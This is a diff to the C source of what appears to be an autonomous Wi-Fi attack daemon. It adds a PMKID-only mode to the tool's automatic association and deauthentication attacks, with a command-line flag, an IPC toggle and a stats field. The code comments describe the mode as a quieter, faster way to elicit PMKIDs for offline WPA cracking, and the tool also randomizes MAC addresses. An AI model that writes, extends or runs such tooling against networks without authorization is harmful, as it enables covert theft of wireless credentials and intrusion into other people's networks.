@@ -50,6 +50,7 @@ struct app {
 	uint64_t           health_frames;    /* capture frames_total at last check */
 	time_t             health_progress;  /* last time frames advanced / hop was off */
 	int                mac_rand;   /* --mac-rand applied to inject when created */
+	int                pmkid_only; /* S2: autonomous attack does assoc only, no deauth */
 	time_t             started;
 };
 
@@ -795,10 +796,13 @@ static void on_attack_timer(int fd, uint32_t events, void *user)
 		assoc_sent++;
 	}
 
-	/* --- deauth associated STAs, skipping cracked APs, up to the budget --- */
-	struct sta_record stas[TABLE_MAX_STAS];
-	int n_stas = table_snapshot_stas(a->table, stas, TABLE_MAX_STAS);
+	/* --- deauth associated STAs, skipping cracked APs, up to the budget ---
+	 * In PMKID-only mode (S2) we never deauth: assoc alone elicits the M1
+	 * PMKID, and skipping deauth cycles targets faster and is far quieter
+	 * (no client disruption, no 4-way chase). */
 	int deauth_sent = 0;
+	struct sta_record stas[TABLE_MAX_STAS];
+	int n_stas = a->pmkid_only ? 0 : table_snapshot_stas(a->table, stas, TABLE_MAX_STAS);
 	for (int i = 0; i < n_stas && deauth_sent < ATTACK_PER_TICK; i++) {
 		if (!stas[i].have_ap) continue;
 		if (table_ap_is_captured(a->table, stas[i].ap_bssid)) continue;
@@ -961,6 +965,21 @@ static int handle_set_mac_rand(struct app *a, int fd, int64_t id, const char *ar
 	return reply_ok_empty(a->ipc, fd, id);
 }
 
+static int handle_set_pmkid_only(struct app *a, int fd, int64_t id, const char *args)
+{
+	if (!args)
+		return reply_error(a->ipc, fd, id, "missing 'enabled'");
+	int64_t en = 0;
+	if (proto_args_get_int(args, "enabled", &en) < 0)
+		return reply_error(a->ipc, fd, id, "missing 'enabled'");
+
+	/* S2: toggle the autonomous attacker between full (assoc+deauth) and
+	 * PMKID-only (assoc, no deauth). Takes effect on the next attack tick;
+	 * harmless when --attack is off. */
+	a->pmkid_only = !!en;
+	return reply_ok_empty(a->ipc, fd, id);
+}
+
 /* ---- frame injection (deauth / assoc) ------------------------------------ */
 
 static int ensure_inject(struct app *a)
@@ -1095,6 +1114,9 @@ static int handle_stats(struct app *a, int fd, int64_t id)
 	if ((r = proto_field_bool(buf, sizeof buf, pos, &first, "attack_active",
 	                          a->attack_fd >= 0)) < 0) return -1;
 	pos = (size_t)r;
+	if ((r = proto_field_bool(buf, sizeof buf, pos, &first, "pmkid_only",
+	                          a->pmkid_only)) < 0) return -1;
+	pos = (size_t)r;
 	if ((r = proto_field_str(buf, sizeof buf, pos, &first, "iface_mode",
 	                         iface_mode_name(a->iface.mode))) < 0) return -1;
 	pos = (size_t)r;
@@ -1143,6 +1165,7 @@ static int on_line(int fd, char *line, size_t len, void *user)
 	if (strcmp(req.cmd, "assoc")       == 0) return handle_assoc(a, fd, req.id, req.args_raw);
 	if (strcmp(req.cmd, "set_ttls")    == 0) return handle_set_ttls(a, fd, req.id, req.args_raw);
 	if (strcmp(req.cmd, "set_mac_rand") == 0) return handle_set_mac_rand(a, fd, req.id, req.args_raw);
+	if (strcmp(req.cmd, "set_pmkid_only") == 0) return handle_set_pmkid_only(a, fd, req.id, req.args_raw);
 
 	return reply_error(a->ipc, fd, req.id, "unknown command");
 }
@@ -1163,6 +1186,7 @@ struct opts {
 	int         attack;
 	int         attack_interval_ms;
 	int         mac_rand;
+	int         pmkid_only;
 };
 
 static void usage(FILE *f, const char *argv0)
@@ -1188,7 +1212,9 @@ static void usage(FILE *f, const char *argv0)
 	    "  -A, --attack             Enable autonomous deauth+assoc attacks\n"
 	    "      --attack-interval MS Attack period ms (default: %d)\n"
 	    "      --mac-rand           Use a fresh random MAC for every assoc\n"
-	    "                           (locally-administered, unicast)\n",
+	    "                           (locally-administered, unicast)\n"
+	    "      --pmkid-only         Autonomous attack sends assoc only (no\n"
+	    "                           deauth): PMKID elicitation, quieter, faster\n",
 	    argv0, DEFAULT_HOP_INTERVAL_MS, DEFAULT_ATTACK_INTERVAL_MS);
 }
 
@@ -1198,6 +1224,7 @@ static int parse_opts(int argc, char **argv, struct opts *o)
 		OPT_HOP_INTERVAL = 256,
 		OPT_ATTACK_INTERVAL,
 		OPT_MAC_RAND,
+		OPT_PMKID_ONLY,
 	};
 	static const struct option longopts[] = {
 		{ "socket",           required_argument, NULL, 's' },
@@ -1213,6 +1240,7 @@ static int parse_opts(int argc, char **argv, struct opts *o)
 		{ "hop-interval",     required_argument, NULL, OPT_HOP_INTERVAL },
 		{ "attack-interval",  required_argument, NULL, OPT_ATTACK_INTERVAL },
 		{ "mac-rand",         no_argument,       NULL, OPT_MAC_RAND },
+		{ "pmkid-only",       no_argument,       NULL, OPT_PMKID_ONLY },
 		{ 0 },
 	};
 	int c;
@@ -1234,6 +1262,7 @@ static int parse_opts(int argc, char **argv, struct opts *o)
 		case OPT_HOP_INTERVAL:    o->hop_interval_ms    = atoi(optarg); break;
 		case OPT_ATTACK_INTERVAL: o->attack_interval_ms = atoi(optarg); break;
 		case OPT_MAC_RAND:        o->mac_rand = 1; break;
+		case OPT_PMKID_ONLY:      o->pmkid_only = 1; break;
 		default:  usage(stderr, argv[0]); return -1;
 		}
 	}
@@ -1337,6 +1366,7 @@ int main(int argc, char **argv)
 	a.attack_fd  = -1;
 	a.health_fd  = -1;
 	a.mac_rand   = o.mac_rand;
+	a.pmkid_only = o.pmkid_only;
 
 	a.ipc = ipc_create(o.sock_path, o.sock_mode);
 	if (!a.ipc) {
